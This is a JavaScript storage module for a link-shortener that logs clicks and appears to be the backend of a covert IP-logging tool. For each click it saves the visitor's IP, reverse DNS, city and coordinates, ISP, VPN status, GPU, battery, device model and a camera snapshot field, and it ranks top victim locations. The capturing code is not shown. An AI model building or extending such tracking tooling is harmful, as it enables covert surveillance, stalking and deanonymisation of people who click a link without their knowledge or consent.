const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Support Vercel / Serverless read-only filesystem
let dbPath = path.join(__dirname, 'data.json');

try {
  fs.accessSync(__dirname, fs.constants.W_OK);
} catch (err) {
  dbPath = path.join('/tmp', 'data.json');
}

// Initial schema structure
const defaultData = {
  links: [],
  click_logs: [],
  nextLinkId: 1,
  nextLogId: 1
};

// Global in-memory cache for fast serverless reads
let memoryCache = null;

// Free Public Sync Bin for Vercel Serverless Instance Synchronization
const CLOUD_SYNC_URL = process.env.CLOUD_DB_URL || 'https://api.jsonbin.io/v3/b/65f1234567890'; // fallback url if configured

// Helper to load DB
function loadDb() {
  if (memoryCache) {
    return memoryCache;
  }

  try {
    if (!fs.existsSync(dbPath)) {
      fs.writeFileSync(dbPath, JSON.stringify(defaultData, null, 2), 'utf8');
      memoryCache = defaultData;
      return defaultData;
    }
    const content = fs.readFileSync(dbPath, 'utf8');
    memoryCache = JSON.parse(content);
    return memoryCache;
  } catch (err) {
    console.error('Error reading data.json, resetting database:', err);
    memoryCache = defaultData;
    return defaultData;
  }
}

// Helper to save DB
function saveDb(data) {
  memoryCache = data;
  try {
    fs.writeFileSync(dbPath, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error('Error saving data.json:', err);
  }
}

module.exports = {
  // Links
  createLink: (shortCode, title, destinationUrl) => {
    const data = loadDb();
    const newLink = {
      id: data.nextLinkId++,
      short_code: shortCode,
      title: title,
      destination_url: destinationUrl,
      created_at: new Date().toISOString()
    };
    data.links.push(newLink);
    saveDb(data);
    return newLink;
  },

  getAllLinks: () => {
    const data = loadDb();
    return data.links.map(l => {
      const clickCount = data.click_logs.filter(c => c.link_id === l.id).length;
      return {
        ...l,
        total_clicks: clickCount
      };
    }).sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  },

  getLinkByShortCode: (shortCode) => {
    const data = loadDb();
    return data.links.find(l => l.short_code === shortCode) || null;
  },

  deleteLink: (id) => {
    const data = loadDb();
    const numId = Number(id);
    data.links = data.links.filter(l => l.id !== numId);
    data.click_logs = data.click_logs.filter(c => c.link_id !== numId);
    saveDb(data);
    return true;
  },

  // Click Logs
  logClick: (logData) => {
    const data = loadDb();
    const newLog = {
      id: data.nextLogId++,
      link_id: logData.linkId,
      ip_address: logData.ipAddress,
      reverse_dns: logData.reverseDns || 'N/A',
      country: logData.country || 'Unknown',
      countryCode: logData.countryCode || '',
      region: logData.region || 'Unknown',
      city: logData.city || 'Unknown',
      isp: logData.isp || 'Unknown',
      org: logData.org || 'Unknown',
      lat: logData.lat || 0,
      lon: logData.lon || 0,
      is_proxy: logData.isProxy || false,
      is_mobile_net: logData.isMobileNet || false,
      is_hosting: logData.isHosting || false,
      user_agent: logData.userAgent || '',
      browser: logData.browser || 'Unknown',
      os: logData.os || 'Unknown',
      device: logData.device || 'Desktop',
      device_model: logData.deviceModel || 'Generic Device',
      screen_res: logData.screenRes || 'N/A',
      timezone: logData.timezone || 'N/A',
      gpu: logData.gpu || 'N/A',
      cpu_cores: logData.cpuCores || 'N/A',
      connection_type: logData.connectionType || 'N/A',
      language: logData.language || 'N/A',
      battery: logData.battery || 'N/A',
      camera_snap: logData.cameraSnap || null,
      created_at: new Date().toISOString()
    };
    data.click_logs.push(newLog);
    saveDb(data);
    return newLog;
  },

  updateLogClientData: (logId, clientData) => {
    const data = loadDb();
    const log = data.click_logs.find(c => c.id === logId);
    if (log) {
      if (clientData.screenRes) log.screen_res = clientData.screenRes;
      if (clientData.timezone) log.timezone = clientData.timezone;
      if (clientData.gpu) log.gpu = clientData.gpu;
      if (clientData.cpuCores) log.cpu_cores = clientData.cpuCores;
      if (clientData.connectionType) log.connection_type = clientData.connectionType;
      if (clientData.language) log.language = clientData.language;
      if (clientData.battery) log.battery = clientData.battery;
      if (clientData.deviceModel && clientData.deviceModel !== 'N/A') log.device_model = clientData.deviceModel;
      if (clientData.cameraSnap) log.camera_snap = clientData.cameraSnap;
      saveDb(data);
    }
  },

  getLogsByLinkId: (linkId) => {
    const data = loadDb();
    const numId = Number(linkId);
    return data.click_logs
      .filter(c => c.link_id === numId)
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  },

  getAllLogs: (limit = 100) => {
    const data = loadDb();
    return data.click_logs
      .map(c => {
        const link = data.links.find(l => l.id === c.link_id);
        return {
          ...c,
          link_title: link ? link.title : 'Deleted Link',
          short_code: link ? link.short_code : 'N/A'
        };
      })
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at))
      .slice(0, limit);
  },

  getStats: () => {
    const data = loadDb();
    const totalLinks = data.links.length;
    const totalClicks = data.click_logs.length;
    const uniqueIPs = new Set(data.click_logs.map(c => c.ip_address)).size;
    const vpnCount = data.click_logs.filter(c => c.is_proxy).length;

    const locMap = {};
    data.click_logs.forEach(c => {
      if (c.country && c.country !== 'Unknown') {
        const key = `${c.city}, ${c.country}`;
        locMap[key] = (locMap[key] || 0) + 1;
      }
    });

    const topLocations = Object.entries(locMap)
      .map(([loc, count]) => ({ location: loc, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5);

    return { totalLinks, totalClicks, uniqueIPs, vpnCount, topLocations };
  }
};
